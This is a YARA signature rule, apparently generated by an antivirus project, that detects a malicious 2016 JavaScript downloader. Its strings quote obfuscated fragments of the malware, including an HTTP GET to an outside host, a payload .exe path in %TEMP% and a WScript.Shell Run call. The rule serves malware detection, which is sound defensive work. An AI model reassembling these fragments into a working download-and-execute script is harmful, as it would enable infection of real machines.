rule sig_20160328_da967ec41411174b23fb72dca61e4d30 {
  meta:
    description = "datamaliciousorder - file 20160328_da967ec41411174b23fb72dca61e4d30.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0de13376a82c4cf591c729ef37d169b7a17207b98d0c98ee64299ba044bedcf3"

  strings:
    $s1  = "function Fsyoszr() {return Dbempyma[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nXbtwJH4W.exe\";};" fullword ascii
    $s2  = "do {WScript[Rrmiuld](Vqdpkyyncc() * 11)} while (Ccbtklhfk[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Ccbtklhfk[Ujvgtwjggq](\"GET\", \"http://topreal.us/l1oad\", false);" fullword ascii
    $s4  = "function Mwcuz(Ujjje, Austbpof){return Ujjje - Austbpof;};" fullword ascii
    $s5  = "var Dbempyma = function Zgtlsy() {return WScript[Vokqa](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kndtqtcxeu() {return ((Odnuppfv == true) && (Odnuppfv == Uclsm)) ? 1 : Hrwkdfk;};" fullword ascii
    $s7  = "function Nmzrcoixwz(Exycmmizwa){Dbempyma[\"Run\"](Exycmmizwa, Hrwkdfk, Hrwkdfk);};" fullword ascii
    $s8  = "function Vqdpkyyncc(){return 22;};" fullword ascii
    $s9  = "var Uclsm = false;" fullword ascii
    $s10 = "var Lltqffvlpv = new this[\"Date\"]();" fullword ascii
    $s11 = "var Odnuppfv = false;" fullword ascii
    $s12 = "function Qtxkonfmh(Tfros) {var Kxzglpwxt = (1, 2, 3, 4, 5, Tfros); return Kxzglpwxt;};" fullword ascii
    $s13 = "Uclsm = true; " fullword ascii
    $s14 = "function Ooagdkz(){return Ayznuu;};" fullword ascii
    $s15 = " while (Ritzu){" fullword ascii
    $s16 = "function Dujfiny(){return Vokqa;};" fullword ascii
    $s17 = "return Mwcuz(Pvpmozgpo, Guuhfpar);" fullword ascii
    $s18 = "Odnuppfv = true; " fullword ascii
    $s19 = "function Ewjsfgf()" fullword ascii
    $s20 = "var Vejpsfty = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}